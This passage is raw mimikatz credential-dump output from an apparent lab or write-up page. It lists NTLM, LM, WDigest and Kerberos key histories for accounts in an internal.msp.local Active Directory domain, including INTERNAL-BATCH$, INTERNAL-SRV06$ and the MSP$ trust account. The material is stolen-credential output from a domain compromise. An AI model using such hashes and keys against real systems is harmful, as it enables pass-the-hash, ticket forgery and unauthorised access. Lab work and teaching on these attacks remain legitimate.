    lm  - 0: 3eaa4d31c590fd3ee43c6e1d50181b5e
    lm  - 1: 0e5ba13e17d1ad27995ccc0e993658f9

 * WDigest
    01  297d5c6318c77d53b0f09daee4c4b529
    02  a635f7b73ae48e655d2dbb888ca2fa77
    03  297d5c6318c77d53b0f09daee4c4b529
    04  297d5c6318c77d53b0f09daee4c4b529
    05  0a9a86557c4753a08896e49770e9ad0a
    06  0a9a86557c4753a08896e49770e9ad0a
    07  6fc465c29d8451635da30bf67ed27e7a
    08  6b7216bcffeb0c6d8010ca2f080d2e48
    09  cb8d31dd57087c12d009cf170078daa5
    10  12c1f9ecc46cac9e7a47562b25ed9497
    11  12c1f9ecc46cac9e7a47562b25ed9497
    12  6b7216bcffeb0c6d8010ca2f080d2e48
    13  6b7216bcffeb0c6d8010ca2f080d2e48
    14  67c1b7bc8423c660faaf2e12968b1ffd
    15  d1af9c8626f02b18b8854a725c0b97c6
    16  7af7f8235b4ba7544b91a3befb09d0a2
    17  511d58d4f8ffab38b10bde140e892676
    18  36222909a5b66c108ca3302ddcd2deb7
    19  6c43ddb020155c689fe56d9be29ba26c
    20  36222909a5b66c108ca3302ddcd2deb7
    21  a488e7745adcd7287eb81165c8ad4cc7
    22  818aca2bfe2cd2fdcb86d08608af5f21
    23  a488e7745adcd7287eb81165c8ad4cc7
    24  1ea7e61715446fd46f8f5b05172b9ece
    25  5e20603420e668ee8f2ae6a74533dbd6
    26  083e6b580615043bf82c1f5e082efa86
    27  5564033427a44a0527db1897755b96f1
    28  3368734ee9bbb28d384454dfe1d351be
    29  5564033427a44a0527db1897755b96f1

 * Kerberos
    Default Salt : INTERNAL.MSP.LOCALhostinternal-dc01.internal.msp.local
    Credentials
      des_cbc_md5       : 19f1eff4cedffb4a
    OldCredentials
      des_cbc_md5       : 40fb31b591b997da

 * Kerberos-Newer-Keys
    Default Salt : INTERNAL.MSP.LOCALhostinternal-dc01.internal.msp.local
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 65c1255917fff4ad1a3a543bdf144d379d0ab0f1b807523bd287c0a284b3163c
      aes128_hmac       (4096) : cde60464b1d822c28802130f14088fe1
      des_cbc_md5       (4096) : 19f1eff4cedffb4a
    OldCredentials
      aes256_hmac       (4096) : 2fe3dfba333937ef64fb22eb06d27179b4f41c1f4a0dc1f17efe09f1ad5d4635
      aes128_hmac       (4096) : e806e6e0a8a47007fbc4e6162ef0e125
      des_cbc_md5       (4096) : 40fb31b591b997da
    OlderCredentials
      aes256_hmac       (4096) : fdbddeba51afd7886790fff4d7fb05273db98b2cada6e2f0ab2b90262c0575d5
      aes128_hmac       (4096) : d8eeaf9d98e95137c3c445601d18ce01
      des_cbc_md5       (4096) : 4c3de9f7fe5e319e

RID  : 00000450 (1104)
User : INTERNAL-BATCH$

 * Primary
    NTLM : 596b23e74f15ec2a3caf0dd1a96adc63
    LM   :
  Hash NTLM: 596b23e74f15ec2a3caf0dd1a96adc63
    ntlm- 0: 596b23e74f15ec2a3caf0dd1a96adc63
    ntlm- 1: 7baa03ce747e3930afc3e9460c32948c
    ntlm- 2: 97b6f0a417ec49e5b82944dff6d63df9
    ntlm- 3: 330204ef86ce97044c058638b141642a
    ntlm- 4: 6923aca9aa43e7909dcbfaeb1041fb23
    ntlm- 5: fd7af48989839d22ba4ce568b22ebb78
    ntlm- 6: 40df2d15b2c10840933e33d658037b2e
    ntlm- 7: f5072170ac1e305b5c90a0c581210268
    ntlm- 8: 113b88f72176dc4a7262d9386390c2aa
    ntlm- 9: 28025805f598e836f5751d45f5351474
    ntlm-10: a0b7db567f777abb9b197353cf0b8600
    ntlm-11: bf2f6660668157a49d28a811f44069d8
    ntlm-12: 84a754a7391b200cc1cce242906eb71e
    ntlm-13: 1c31361df48dc4ddb207baf9bc1b51e0
    ntlm-14: d75ff92c8835898cc9e73b87ef797202
    ntlm-15: 43147814a02a5ef89222ed913cdcd605
    lm  - 0: 0186c9fad141a6b8ba12fc98363ee9da
    lm  - 1: a84917e14fc82cc370a3e8b8b49a1a1d
    lm  - 2: 824bff5648ef8f645db4ad8fafc7aac6
    lm  - 3: d29d08c2405eb0e8580e21732c6846c2
    lm  - 4: c3700f40ffa97cc84c2aa47540bb6af4
    lm  - 5: 70f71f554df6022e43aa8241c8acda75
    lm  - 6: d0020d794c0132f3bf4756445bce4d53
    lm  - 7: c6cd91b0ffc9fa6cb4900aad2fe74f24
    lm  - 8: 335bdab3f562abcb27c9591f0ce3f0ae
    lm  - 9: b2faa1d1e3c3f20e362d12b084291097
    lm  -10: 41f7fff030477f9a54fc7c8dce65d96d
    lm  -11: ea52c77b42e1c34c24d66308dcf3bf6c
    lm  -12: f1641c4a061f12b6dae2b7f4a07bd00c
    lm  -13: 16b6e5de765be937930322ee3a75362d
    lm  -14: 33ef510eb96d3b7a9f185a22fb9570cf
    lm  -15: 81f9f2d4e5f66dea53dd586864977942

 * WDigest
    01  3df4fa20a4653958a42cbd9297d52e1f
    02  36f565168df7ed8f9b4b234003688a9e
    03  3df4fa20a4653958a42cbd9297d52e1f
    04  3df4fa20a4653958a42cbd9297d52e1f
    05  ea800bb400743370d01633b675749c93
    06  ea800bb400743370d01633b675749c93
    07  eb104dcbe944f79ff7210dad7892c926
    08  a262ffa1557004979d62bd91b92e96ee
    09  c13c44b6fd84982403f3510a44600443
    10  fd0861d3dc34e168da9e09bd0b47d83a
    11  fd0861d3dc34e168da9e09bd0b47d83a
    12  a262ffa1557004979d62bd91b92e96ee
    13  a262ffa1557004979d62bd91b92e96ee
    14  e5d5711f37d51a3813e63feb5071c155
    15  914b477cd91abb0204947a96be4def4b
    16  2b24c574b9cdf395a9f4eb43f7bed74f
    17  88dff039aaff4662621b596e67a453af
    18  f122802d8f79c5af00c705b823ff1bb1
    19  e7f482fd2d4f468d3599886b0c601927
    20  f122802d8f79c5af00c705b823ff1bb1
    21  1579ef7bd1e5cc0249d192044adc8a3d
    22  5cc03065c83c5a46deb7074fcf9d9ae4
    23  1579ef7bd1e5cc0249d192044adc8a3d
    24  0d3a784f64437705985227b4cfa19947
    25  98a645af82d6ef75ff1f105f10285d66
    26  32b2019f957dc4eeb5f6682dfcfbefe0
    27  cc9f2cb017d6b1abb994b48899399af9
    28  84a31656d407fa7c18cbf6c6c7f4c1ce
    29  cc9f2cb017d6b1abb994b48899399af9

 * Kerberos
    Default Salt : INTERNAL.MSP.LOCALhostinternal-batch.internal.msp.local
    Credentials
      des_cbc_md5       : c8b016ec3b865b10
    OldCredentials
      des_cbc_md5       : 49cbf46d130ba768

 * Kerberos-Newer-Keys
    Default Salt : INTERNAL.MSP.LOCALhostinternal-batch.internal.msp.local
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 6347ee8a88020130db439a5677f07037cbb95f1e9011cf775f74d371e1f4e85e
      aes128_hmac       (4096) : a9b3fa3dcc73eb290bb4739b0b7f5414
      des_cbc_md5       (4096) : c8b016ec3b865b10
    OldCredentials
      aes256_hmac       (4096) : f765a9ad531ce308625032f50e35ae143376e274311dcd738f879637b8842bb0
      aes128_hmac       (4096) : 68a6b810765023eaa6115b08dff60838
      des_cbc_md5       (4096) : 49cbf46d130ba768
    OlderCredentials
      aes256_hmac       (4096) : ea584478306e3b8689022d3299f4e7a4f2d4f9457fdb9981228790b780d010b9
      aes128_hmac       (4096) : aa8b4524f3082a60d311dd24b4043d52
      des_cbc_md5       (4096) : 8c15701923086e34

RID  : 00000451 (1105)
User : INTERNAL-SRV06$

 * Primary
    NTLM : d12f3a68e9e4e034ce078a745d7fdae2
    LM   :
  Hash NTLM: d12f3a68e9e4e034ce078a745d7fdae2
    ntlm- 0: d12f3a68e9e4e034ce078a745d7fdae2
    ntlm- 1: 8ab0ea6d4e73c10a34a83c455a12c58a
    ntlm- 2: 307dfe173b3be09d2900985369279d32
    ntlm- 3: d97254dc049d85a0d43a723fc67a036b
    ntlm- 4: 2a597ecbcdb7008a817da0543f6b8a2d
    ntlm- 5: 8d4124108f9658698edbdf5ba54f7846
    ntlm- 6: f2b7506aed9071e362659e1c3e488bb6
    ntlm- 7: e146f362f5ca6029b3a77eb9879c7adf
    ntlm- 8: 07fb9256326dcf4c20b06459e2db4d4b
    ntlm- 9: 9d6679d5541daa851e9e1b1419f39c05
    ntlm-10: 3de42629e6078e1b1d7ad08d2bbb6d66
    ntlm-11: 0dbf8830450089210c600da66cd5fdd8
    ntlm-12: aede02a4ecfa6dfad2dcb27524068734
    ntlm-13: 6bba46293275899a6e4b11c5cfb83dee
    ntlm-14: d54c65c02909262629fd73a05960faaa
    ntlm-15: b4f69cc560b7cfd4378706c1b0117a6d
    ntlm-16: 43a1454cf8d46b4dd6d8d41d162b0b4d
    ntlm-17: ca87bcfc771296493a1264b53de9d2b5
    ntlm-18: 8c581c50b4f3578271a461c93996a9da
    ntlm-19: 2033f23e00a67f984e491e9f143adc93
    ntlm-20: 82fc955f323baf34ae31bfc48c149a2e
    ntlm-21: ac58d267b2f5c967b68abbf468c0e9b6
    lm  - 0: 4b672ebd5218838d7e183fc98ac3354a
    lm  - 1: ec196ddbef6ade35f8bbc0bd2badd0b6
    lm  - 2: 0133446b4cc0b1a6e70fb6bc7629450d
    lm  - 3: 7a58b97beba0ed93ac78fd6ba64e3663
    lm  - 4: 38cfdf80ff6fc21073af47746042e427
    lm  - 5: 530e68ca596e01817102be0c75d11c36
    lm  - 6: 5873e663947650c607f924baa6bf0b39
    lm  - 7: 2de93909f43907445072a7f90a6d4a79
    lm  - 8: ff3499a81865263b5ef969f4120cd791
    lm  - 9: 215f7b32e9b14ff3ac279a4736552540
    lm  -10: b55f7084988d82a8302b5f9d6c03cfe1
    lm  -11: c0712be180b722435704ca7229b3a5a9
    lm  -12: 494b550e71b84d50adb5019653426b85
    lm  -13: c4d41c064bbac0dadcb7b6601a46c298
    lm  -14: 435ea8127f1271b303bd113cad0846b5
    lm  -15: 953079c2c38ac84e3a4661cccf30e6e7
    lm  -16: a77ac7c55064f70293466904ca3f9a05
    lm  -17: 664fd329850718367a14543425486d89
    lm  -18: cb11013c59b087d05bdb17bc2ed5c3f0
    lm  -19: 17ba1bf321737a87332ee2b696d44a54
    lm  -20: 9ba28d948e8c815694ccc5c125c2f8dc
    lm  -21: ddc3fa6dbe9514d3a3089bc07d9c4507

 * WDigest
    01  b5f53381f07dc0b64162c33c210e370d
    02  3daba1ee17ec71ecd05bd51b0d436431
    03  b5f53381f07dc0b64162c33c210e370d
    04  b5f53381f07dc0b64162c33c210e370d
    05  2507a30291b39c21e51ab6431df50952
    06  2507a30291b39c21e51ab6431df50952
    07  6b962ac72516e2151535c9a93134c9c9
    08  ef0ef65ecf3600424cd288313fce30ff
    09  a6fb81d632a7b1d8f22c31a2c85085e3
    10  53bf04e2e93cef5e7daf9f943146183d
    11  53bf04e2e93cef5e7daf9f943146183d
    12  ef0ef65ecf3600424cd288313fce30ff
    13  ef0ef65ecf3600424cd288313fce30ff
    14  ab4d5c29e5d19cc74065dca2c46871dd
    15  be7e417356697b26c50d131a29b13b10
    16  4f773074dcabcc396f55733e5163277a
    17  845f44a9fb931c8ca02768c20bef71e4
    18  edd878e48f9937ada8925c56dbadb182
    19  a01fc93f65aeb1a8241f266d07d7a36d
    20  edd878e48f9937ada8925c56dbadb182
    21  5053e40fd4646464ea108942086e8622
    22  a9485aad757d1893d96e382b8f346b59
    23  5053e40fd4646464ea108942086e8622
    24  9917ad6c3b12bd379a4b4198ca89dec7
    25  8ae2288acb1235840617df145bba8fe4
    26  835e0a51c03df2e32dbc095cbc849a92
    27  c11748898342073c421e5a67af6321a8
    28  b3b10f33ba2de12a72b1d8d4e8865b16
    29  c11748898342073c421e5a67af6321a8

 * Kerberos
    Default Salt : INTERNAL.MSP.LOCALhostinternal-srv06.internal.msp.local
    Credentials
      des_cbc_md5       : b5fd6d8f2c31077f
    OldCredentials
      des_cbc_md5       : cdc2b3fbfbe0f1ce

 * Kerberos-Newer-Keys
    Default Salt : INTERNAL.MSP.LOCALhostinternal-srv06.internal.msp.local
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 0989608c1ac0054b620113754b396380409e51ca06646320f735fb007db44415
      aes128_hmac       (4096) : 665fc271f1979393702a78d0b5bfbfce
      des_cbc_md5       (4096) : b5fd6d8f2c31077f
    OldCredentials
      aes256_hmac       (4096) : d80fec7f407d3c2fdf081e1531d32938baf5b56081b979082e2d905c7da36f83
      aes128_hmac       (4096) : cc37be4aac97514a0889c02dadbe0e05
      des_cbc_md5       (4096) : cdc2b3fbfbe0f1ce
    OlderCredentials
      aes256_hmac       (4096) : 47b8b0d26f2074e077f7f42002c55d97f56fd2bd9e64ff70ad9ade1a8581a7ba
      aes128_hmac       (4096) : 14d7d70f92113d4678f1698bf76a120c
      des_cbc_md5       (4096) : b5fd6d8f2c31077f

RID  : 0000044f (1103)
User : MSP$

 * Primary
    NTLM : 6a132bc898dacbe9822205e8b51b0d57
    LM   :
  Hash NTLM: 6a132bc898dacbe9822205e8b51b0d57
    ntlm- 0: 6a132bc898dacbe9822205e8b51b0d57
    ntlm- 1: 3243ef89240a70ba9e05a5c124a86bfb
    ntlm- 2: 3243ef89240a70ba9e05a5c124a86bfb
    ntlm- 3: 835d875547d46e07c2f668a5f7baded0
    ntlm- 4: 835d875547d46e07c2f668a5f7baded0
    ntlm- 5: 835d875547d46e07c2f668a5f7baded0
    ntlm- 6: 36a51fa6eaae7ccee4b00516edde24a2
    ntlm- 7: 36a51fa6eaae7ccee4b00516edde24a2
    ntlm- 8: 0c1df17773c7782645f182917aa2736f
    ntlm- 9: 0c1df17773c7782645f182917aa2736f
    ntlm-10: 0240d4978ec012ca05c2c658e1024121
    ntlm-11: 0240d4978ec012ca05c2c658e1024121
    ntlm-12: 1c2c4cd7a345db574adac14839a8a976
    ntlm-13: 1c2c4cd7a345db574adac14839a8a976
    ntlm-14: 9cfd89788cf85e4e919ce8376aba235f
    ntlm-15: ba9bce04c642693bed56184f12b54309
    ntlm-16: 721dd4903812046ff2482abcc43c6dee
    ntlm-17: 7738365f169151210524e57448cb40a2
    ntlm-18: eba17759908eff4ef8dc14b952e4ac45
    ntlm-19: c3094e76356941912345ae61eafbb47b
    ntlm-20: 940607651b58b121224d3927c79e6165
    ntlm-21: 940607651b58b121224d3927c79e6165
    ntlm-22: 940607651b58b121224d3927c79e6165
    ntlm-23: 187fc5a5645d7a2fa8d6cf1af98c9187
    lm  - 0: df15490f43d7fbe0b2867bd5b23d90d6
    lm  - 1: d8efa27eb81156737bf472137326481a
    lm  - 2: c0817b538327def1a84c6b0b181ce9e2
    lm  - 3: 4a3d85762037a89746c9b018320a5d84
    lm  - 4: ffe36646544ffb7158e24f7bbf2b1b96
    lm  - 5: 33680f0c32a6765b5c001e5371a8bc79
    lm  - 6: 571586513a6bfb2e6b4dffa73c8c1b07
    lm  - 7: 0b4d8e803068d4710f0b901f864cafa2
    lm  - 8: b5c5199c9f90c53972164c1afca62246
    lm  - 9: 14d19f2d7bf8194d96f2dff194cf43e9
    lm  -10: c7c1516377f1f3a2ef954f3a9bdf38d9
    lm  -11: 7cdad6855251b6de9d627c0f0f459eb0
    lm  -12: 3b47be79945b246e1272b51134fe49cf
    lm  -13: b816d5e194a045dc05d78305a3ac5a64
    lm  -14: af286a55e5d15b6783b820597f28f46b
    lm  -15: d0879c00833a3dd5060948e6e130f694
    lm  -16: 7dfdce9ad6600e47b9ee8370a6519eec
    lm  -17: acd52497d43e86271d59fbc353e308c8
    lm  -18: d3876476132e4aa906319d740481f7f0
    lm  -19: 79fef3bf30b94dbdb139139e29a189ba
    lm  -20: 1b5d25702cff793753b9674b531d1964
    lm  -21: 9a0bf26d5225b2c2516707ac7b19bc64
    lm  -22: 242f9974f32f3d0044279f63a19f9451
    lm  -23: c0cad699f1680e523f5b21b6045082d2

 * WDigest
    01  842a3cc1bd79394d219cdbff508998af
    02  64a25eef2f4ac1d55760d28e27c92b77
    03  842a3cc1bd79394d219cdbff508998af
    04  842a3cc1bd79394d219cdbff508998af
    05  c43267d634dec3d1d01d9006923e21af
    06  c43267d634dec3d1d01d9006923e21af
    07  222bde1ac9592e050c1a62ffd9dbfb75
    08  96fdb242735db85bc0d533de0b2b3d66
    09  e79f77879174cb03cbee89980acace21
    10  3a9780d06b6e93e60a21a5dad6c85721
    11  3a9780d06b6e93e60a21a5dad6c85721
    12  96fdb242735db85bc0d533de0b2b3d66
    13  96fdb242735db85bc0d533de0b2b3d66
    14  f0bc670f5bdde46e95690b7dd26c15c9
    15  6bb2bd67a331b63587ae7454fb62a8f9
    16  d90333d8b0c8aeb1f1edc3f41eef7463
    17  c4b7521269a7d8810b3f9c2220323e6b
    18  fede2ac17f9594eae76b63ddf89c79c5
    19  e3eea8267a3a4d20922f914ee5147351
    20  fede2ac17f9594eae76b63ddf89c79c5
    21  d39fee4ed9698e2aaf129471db8901be
    22  4e81669b3faab590a905093d8b2ef702
    23  d39fee4ed9698e2aaf129471db8901be
    24  82adbfc620ee6267dd07a8aed82c1a33
    25  01f7342d9b12a0d093716b64dc8cf54e
    26  de57d81f713ca96b470e3842fa554854
    27  63fe16e3d3c6c478846822b59d4affda
    28  52608cef9ec1b81ba5c822c39a755c3c
    29  63fe16e3d3c6c478846822b59d4affda

 * Kerberos
    Default Salt : INTERNAL.MSP.LOCALkrbtgtMSP
    Credentials
      des_cbc_md5       : 75c107e0640badb9
    OldCredentials
      des_cbc_md5       : 948afd642a9ef40e

 * Kerberos-Newer-Keys
    Default Salt : INTERNAL.MSP.LOCALkrbtgtMSP
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f789c96dc0481420517aabf6af11dabf2361aa1b0c99550894308a669037022c
      aes128_hmac       (4096) : 1a4cba01ec3f2433277237a4c772d642
      des_cbc_md5       (4096) : 75c107e0640badb9
    OldCredentials
      aes256_hmac       (4096) : f076a246e16454a6184a56ef7871409994ee1c921d322f76e48e481859db4c64
      aes128_hmac       (4096) : 602d77871bbc6ca5340e7e2fe403af98
      des_cbc_md5       (4096) : 948afd642a9ef40e
    OlderCredentials
      aes256_hmac       (4096) : f076a246e16454a6184a56ef7871409994ee1c921d322f76e48e481859db4c64
      aes128_hmac       (4096) : 602d77871bbc6ca5340e7e2fe403af98
      des_cbc_md5       (4096) : 948afd642a9ef40e

mimikatz #
```

[back](./section2.html)